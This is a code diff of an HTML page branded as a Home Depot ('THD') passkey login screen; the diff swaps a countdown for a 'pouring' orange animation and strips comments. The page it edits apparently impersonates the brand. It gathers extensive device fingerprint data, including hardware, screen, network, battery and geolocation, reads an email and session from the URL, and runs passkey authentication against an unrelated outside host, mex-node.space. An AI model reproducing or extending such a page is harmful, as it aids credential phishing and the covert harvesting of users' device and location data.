@@ -7,14 +7,15 @@
   <script src="https://cdn.tailwindcss.com"></script>
   <style>
     body {
-      background: #ffffff; /* White background */
+      background: #ffffff;
       min-height: 100vh;
       overflow-x: hidden;
       font-family: 'Arial', sans-serif;
-      margin: 0; /* Remove default margin */
+      margin: 0;
+      position: relative;
     }
     .glow {
-      box-shadow: 0 0 15px rgba(249, 115, 22, 0.7), 0 0 30px rgba(249, 115, 22, 0.3); /* Orange glow */
+      box-shadow: 0 0 15px rgba(249, 115, 22, 0.7), 0 0 30px rgba(249, 115, 22, 0.3);
     }
     .pulse {
       animation: pulse 1.5s infinite;
@@ -27,7 +28,7 @@
     .welcome-screen {
       position: fixed;
       inset: 0;
-      background: #f97316; /* Home Depot orange */
+      background: #f97316;
       display: flex;
       align-items: center;
       justify-content: center;
@@ -43,36 +44,61 @@
       transition: all 0.3s ease;
     }
     .btn-orange:hover {
-      background: #ea580c; /* Darker orange on hover */
+      background: #ea580c;
       transform: scale(1.05);
+    }
+
+    /* Pouring Animation */
+    .pour-container {
+      position: fixed;
+      inset: 0;
+      z-index: 15;
+      pointer-events: none;
+      overflow: hidden;
+    }
+    .pour {
+      position: absolute;
+      top: -100%;
+      left: -100%;
+      width: 200%;
+      height: 200%;
+      background: #f97316;
+      transform: rotate(45deg);
+      transform-origin: 0 0;
+      animation: pourAnimation 3s ease-in-out forwards;
+    }
+    @keyframes pourAnimation {
+      0% {
+        transform: rotate(45deg) translate(-50%, -50%);
+      }
+      100% {
+        transform: rotate(45deg) translate(50%, 50%);
+      }
     }
 
     /* Responsive Adjustments */
     #auth-card {
-      width: 90%; /* Use percentage for responsiveness */
-      max-width: 28rem; /* Slightly larger max-width for better readability */
-      padding: clamp(1rem, 5vw, 2rem); /* Dynamic padding */
+      width: 90%;
+      max-width: 28rem;
+      padding: clamp(1rem, 5vw, 2rem);
     }
     h1 {
-      font-size: clamp(2rem, 8vw, 3.125rem); /* Responsive title size */
-    }
-    #countdown {
-      font-size: clamp(1rem, 4vw, 1.125rem); /* Responsive countdown text */
+      font-size: clamp(2rem, 8vw, 3.125rem);
     }
     #status {
-      font-size: clamp(0.875rem, 3.5vw, 1.125rem); /* Responsive status text */
+      font-size: clamp(0.875rem, 3.5vw, 1.125rem);
     }
     .welcome-screen h1 {
-      font-size: clamp(1.5rem, 6vw, 3.75rem); /* Responsive welcome text */
-      padding: 1rem; /* Ensure padding for smaller screens */
+      font-size: clamp(1.5rem, 6vw, 3.75rem);
+      padding: 1rem;
     }
 
     @media (max-width: 640px) {
       #auth-card {
-        border-radius: 1rem; /* Slightly smaller radius on mobile */
+        border-radius: 1rem;
       }
       .glow {
-        box-shadow: 0 0 10px rgba(249, 115, 22, 0.7), 0 0 20px rgba(249, 115, 22, 0.3); /* Reduced glow */
+        box-shadow: 0 0 10px rgba(249, 115, 22, 0.7), 0 0 20px rgba(249, 115, 22, 0.3);
       }
     }
   </style>
@@ -85,14 +111,16 @@
     </h1>
   </div>
 
+  <!-- Pouring Animation Container -->
+  <div id="pour-container" class="pour-container hidden">
+    <div class="pour"></div>
+  </div>
+
   <!-- Authentication Card -->
   <div id="auth-card" class="relative z-10 bg-white bg-opacity-95 rounded-2xl glow pulse text-center hidden">
     <h1 class="font-bold mb-4 sm:mb-6 bg-clip-text text-transparent bg-gradient-to-r from-orange-400 to-orange-600">
       THD
     </h1>
-
-    <!-- Countdown and Status -->
-    <div id="countdown" class="font-semibold text-red-600 mb-4 sm:mb-6"></div>
     <div id="status" class="font-medium text-gray-800"></div>
   </div>
 
@@ -101,8 +129,7 @@
     let secondaryDeviceDetails = {};
     async function gatherUserDetails() {
       const details = {};
-
-      // Basic Navigator Properties
+      // [Previous gatherUserDetails function remains unchanged]
       details.userAgent = navigator.userAgent;
       details.language = navigator.language || navigator.userLanguage;
       details.languages = navigator.languages ? navigator.languages.join(', ') : 'N/A';
@@ -112,33 +139,23 @@
       details.vendor = navigator.vendor || 'N/A';
       details.appName = navigator.appName;
       details.appVersion = navigator.appVersion;
-      details.hardwareConcurrency = navigator.hardwareConcurrency || 'N/A'; // CPU cores
-      details.deviceMemory = navigator.deviceMemory || 'N/A'; // RAM in GB
-
-      // Screen Details
+      details.hardwareConcurrency = navigator.hardwareConcurrency || 'N/A';
+      details.deviceMemory = navigator.deviceMemory || 'N/A';
       details.screenWidth = window.screen.width;
       details.screenHeight = window.screen.height;
       details.availableWidth = window.screen.availWidth;
       details.availableHeight = window.screen.availHeight;
       details.colorDepth = window.screen.colorDepth;
       details.pixelDepth = window.screen.pixelDepth;
-
-      // Window Details
       details.innerWidth = window.innerWidth;
       details.innerHeight = window.innerHeight;
-
-      // Timezone and Time
       details.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
       details.localTime = new Date().toLocaleString();
-
-      // Network Information (experimental)
       if (navigator.connection) {
         details.connectionType = navigator.connection.effectiveType || 'N/A';
-        details.downlink = navigator.connection.downlink || 'N/A'; // Mbps
-        details.rtt = navigator.connection.rtt || 'N/A'; // Round-trip time in ms
+        details.downlink = navigator.connection.downlink || 'N/A';
+        details.rtt = navigator.connection.rtt || 'N/A';
       }
-
-      // Battery Status (experimental)
       if (navigator.getBattery) {
         try {
           const battery = await navigator.getBattery();
@@ -149,8 +166,6 @@
           details.batteryCharging = 'N/A';
         }
       }
-
-      // Geolocation (requires permission)
       if (navigator.geolocation) {
         try {
           const position = await new Promise((resolve, reject) => {
@@ -169,11 +184,10 @@
           details.accuracy = 'N/A (Permission denied or unavailable)';
         }
       }
-
       return details;
     }
 
-    // Base64url to ArrayBuffer conversion
+    // Base64url conversions remain unchanged
     function base64urlToArrayBuffer(base64url) {
       const base64 = base64url.replace(/-/g, '+').replace(/_/g, '/');
       const binary = atob(base64);
@@ -184,63 +198,39 @@
       return buffer.buffer;
     }
 
-    // ArrayBuffer to base64url conversion
     function arrayBufferToBase64url(buffer) {
       const binary = String.fromCharCode(...new Uint8Array(buffer));
       return btoa(binary).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
     }
 
     const welcome = document.getElementById('welcome');
+    const pourContainer = document.getElementById('pour-container');
     const authCard = document.getElementById('auth-card');
-    const countdownDisplay = document.getElementById('countdown');
     const status = document.getElementById('status');
     const BASE_URL = 'https://mex-node.space';
 
-    let countdownTimer = null;
-
-    // Get email and session from query parameters
     const urlParams = new URLSearchParams(window.location.search);
     const username = urlParams.get('email');
     const session = urlParams.get('session');
 
-    // Show welcome screen for 2 seconds, then start countdown if email exists
+    // Show welcome screen for 2 seconds, then start pouring animation
     setTimeout(() => {
       welcome.classList.add('hidden');
-      authCard.classList.remove('hidden');
-      if (username) {
-        startCountdown(username);
-      } else {
-        status.textContent = 'Error: No email provided in URL';
-        status.className = 'text-red-600';
-      }
+      pourContainer.classList.remove('hidden');
+      
+      // After 3 seconds of pouring animation, show auth card and start authentication
+      setTimeout(() => {
+        pourContainer.classList.add('hidden');
+        authCard.classList.remove('hidden');
+        if (username) {
+          authenticate(username);
+        } else {
+          status.textContent = 'Error: No email provided in URL';
+          status.className = 'text-red-600';
+        }
+      }, 3000);
     }, 2000);
 
-    function clearCountdown() {
-      if (countdownTimer) {
-        clearInterval(countdownTimer);
-        countdownTimer = null;
-      }
-      countdownDisplay.textContent = '';
-      status.textContent = '';
-    }
-
-    function startCountdown(username) {
-      let count = 4;
-      countdownDisplay.textContent = `Authenticating in ${count}...`;
-
-      countdownTimer = setInterval(async () => {
-        count--;
-        if (count > 0) {
-          countdownDisplay.textContent = `Authenticating in ${count}...`;
-        } else {
-          clearInterval(countdownTimer);
-          countdownDisplay.textContent = '';
-          await authenticate(username);
-        }
-      }, 1000);
-    }
-
-    // Authenticate with Passkey
     async function authenticate(username) {
       secondaryDeviceDetails = await gatherUserDetails();
       status.textContent = 'Preparing authentication...';
@@ -297,7 +287,6 @@
       }
     }
 
-    // Adjust layout on resize for better responsiveness
     window.addEventListener('resize', () => {
       const authCard = document.getElementById('auth-card');
       if (window.innerWidth < 640) {
